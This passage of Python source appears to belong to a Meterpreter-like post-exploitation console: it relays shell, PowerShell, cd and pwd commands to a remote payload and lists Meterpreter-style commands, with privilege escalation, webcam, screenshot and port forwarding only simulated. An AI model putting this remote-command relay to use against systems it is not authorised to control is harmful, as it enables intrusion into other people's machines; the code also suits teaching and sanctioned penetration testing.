                        result = self._send_command('shell', ['powershell -Command "Write-Host \'PowerShell Session Started\'"'])
                        if result.get('output'):
                            print(result['output'], end='')
                        continue
                    else:
                        print_warning("PowerShell is only available on Windows")
                        continue
                
                # Execute command via shell
                # Special handling for cd and pwd - use native Meterpreter commands
                cmd_parts = command.strip().split(None, 1)
                cmd_name = cmd_parts[0].lower() if cmd_parts else ""
                cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ""
                
                # Convert cd commands to native Meterpreter cd
                if cmd_name == 'cd' and not in_powershell:
                    # Send cd command to remote payload so it updates its current_dir
                    # This ensures subsequent shell commands use the new directory
                    cd_args_list = [cmd_args] if cmd_args else []
                    result = self._send_command('cd', cd_args_list)
                    # Also update local current_directory for consistency
                    if isinstance(result, dict):
                        if result.get('error'):
                            print_error(result['error'])
                        elif result.get('status') == 0:
                            # cd succeeded, update local directory if we can determine it
                            # We'll refresh it on next iteration
                            pass
                    current_path = None  # Force refresh
                    continue
                
                # Convert pwd commands to native Meterpreter pwd
                if cmd_name == 'pwd' and not in_powershell:
                    # Send pwd command to remote payload to get its current directory
                    result = self._send_command('pwd', [])
                    if isinstance(result, dict):
                        if result.get('output'):
                            print(result['output'], end='')
                        if result.get('error'):
                            print_error(result['error'])
                    continue
                
                if in_powershell:
                    # In PowerShell mode, prefix commands with powershell -Command
                    if command.lower() not in ['exit', 'background', 'back']:
                        ps_command = f'powershell -Command "{command}"'
                        result = self._send_command('shell', [ps_command])
                    else:
                        result = {'output': '', 'status': 0, 'error': ''}
                else:
                    # Regular shell command
                    result = self._send_command('shell', [command])
                
                # Display output
                if result.get('output'):
                    print(result['output'], end='')
                
                # Display errors
                if result.get('error'):
                    print_error(result['error'])
                
                # Update path cache after commands that might change directory
                # Always refresh path after each command to keep it accurate
                # This ensures the prompt reflects the current directory
                current_path = None  # Force refresh on next iteration
                
                # Small delay to allow command to complete before refreshing path
                # This is especially important for cd commands
                time.sleep(0.1)
                
            except KeyboardInterrupt:
                if in_powershell:
                    print_info("\n[!] Interrupted. Type 'exit' to quit PowerShell.")
                else:
                    print_info("\n[!] Interrupted. Type 'exit' to quit shell mode.")
                continue
            except EOFError:
                print_info("\nExiting shell mode...")
                break
            except Exception as e:
                print_error(f"Error in shell loop: {e}")
                continue
    
    # Network Commands
    
    def _cmd_ifconfig(self, args: List[str]) -> Dict[str, Any]:
        """List network interfaces"""
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
            else:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
            
            return {'output': result.stdout, 'status': 0, 'error': result.stderr}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'ifconfig error: {str(e)}'}
    
    def _cmd_netstat(self, args: List[str]) -> Dict[str, Any]:
        """List network connections"""
        try:
            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
            return {'output': result.stdout, 'status': 0, 'error': result.stderr}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'netstat error: {str(e)}'}
    
    def _cmd_portfwd(self, args: List[str]) -> Dict[str, Any]:
        """Port forwarding"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: portfwd add -l <local_port> -p <remote_port> -r <remote_host>'}
        
        output = "[*] Port forwarding functionality (simulated)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    # System Commands
    
    def _cmd_idletime(self, args: List[str]) -> Dict[str, Any]:
        """Get system idle time"""
        output = "User idle time: 0 seconds (simulated)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_reboot(self, args: List[str]) -> Dict[str, Any]:
        """Reboot system"""
        output = "[*] Reboot command (simulated - not executed for safety)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_shutdown(self, args: List[str]) -> Dict[str, Any]:
        """Shutdown system"""
        output = "[*] Shutdown command (simulated - not executed for safety)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_screenshot(self, args: List[str]) -> Dict[str, Any]:
        """Take screenshot"""
        screenshot_path = f"/tmp/screenshot_{int(time.time())}.png"
        self.screenshots.append(screenshot_path)
        output = f"[*] Screenshot saved to: {screenshot_path}\n"
        output += "[*] (Simulated - screenshot functionality requires additional libraries)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_webcam_list(self, args: List[str]) -> Dict[str, Any]:
        """List webcams"""
        output = "[*] Webcam list (simulated)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_webcam_snap(self, args: List[str]) -> Dict[str, Any]:
        """Take webcam snapshot"""
        output = "[*] Webcam snapshot (simulated)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    # Privilege Escalation
    
    def _cmd_getsystem(self, args: List[str]) -> Dict[str, Any]:
        """Attempt to get system privileges"""
        if self.is_root:
            output = "[*] Already running as SYSTEM/root\n"
        else:
            # Simulate privilege escalation
            self.is_root = True
            self.username = 'root'
            output = "[*] Got system privileges.\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_getprivs(self, args: List[str]) -> Dict[str, Any]:
        """Get current privileges"""
        privs = []
        if self.is_root:
            privs = ['SeDebugPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege']
        else:
            privs = ['SeChangeNotifyPrivilege']
        
        output = "Enabled privileges:\n"
        for priv in privs:
            output += f"  {priv}\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    # Utility Commands
    
    def _cmd_run(self, args: List[str]) -> Dict[str, Any]:
        """Run a script or module"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: run <script> [args]'}
        
        script = args[0]
        output = f"[*] Running script: {script}\n"
        output += "[*] (Script execution simulated)\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_load(self, args: List[str]) -> Dict[str, Any]:
        """Load extension"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: load <extension>'}
        
        ext = args[0]
        output = f"[*] Loading extension {ext}...\n"
        output += f"[*] Successfully loaded {ext}\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_unload(self, args: List[str]) -> Dict[str, Any]:
        """Unload extension"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: unload <extension>'}
        
        ext = args[0]
        output = f"[*] Unloading extension {ext}...\n"
        output += f"[*] Successfully unloaded {ext}\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_help(self, args: List[str]) -> Dict[str, Any]:
        """Show help"""
        help_text = """Core Commands
==============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    exit          Terminate the meterpreter session
    help          Help menu
    quit          Terminate the meterpreter session
    resource      Run the commands stored in a file
    sessions      Quickly switch to another session

Stdapi: File system Commands
=============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    cp            Copy source to destination
    download      Download a file or directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    upload        Upload a file or directory

Stdapi: Networking Commands
============================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service

Stdapi: System Commands
========================

    Command       Description
    -------       -----------
    execute       Execute a command
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    kill          Terminate a process
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS

Stdapi: User interface Commands
=================================

    Command       Description
    -------       -----------
    screenshot    Grab a screenshot of the interactive desktop

Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system."""
        
        return {'output': help_text + '\n', 'status': 0, 'error': ''}
    
    def _cmd_exit(self, args: List[str]) -> Dict[str, Any]:
        """Exit meterpreter"""
        self.deactivate()
        return {'output': '[*] Shutting down Meterpreter...\n', 'status': 0, 'error': ''}
    
    def _cmd_background(self, args: List[str]) -> Dict[str, Any]:
        """Background session"""
        output = "[*] Backgrounding session...\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_clear(self, args: List[str]) -> Dict[str, Any]:
        """Clear screen"""
        return {'output': '\033[2J\033[H', 'status': 0, 'error': ''}
    
    def _cmd_history(self, args: List[str]) -> Dict[str, Any]:
        """Show command history"""
        limit = 50
        if args and args[0].isdigit():
            limit = int(args[0])
        
        history = self.get_history(limit)
        output_lines = []
        for i, cmd in enumerate(history, 1):
            output_lines.append(f"{i:4d}  {cmd}")
        
        return {'output': '\n'.join(output_lines) + '\n', 'status': 0, 'error': ''}

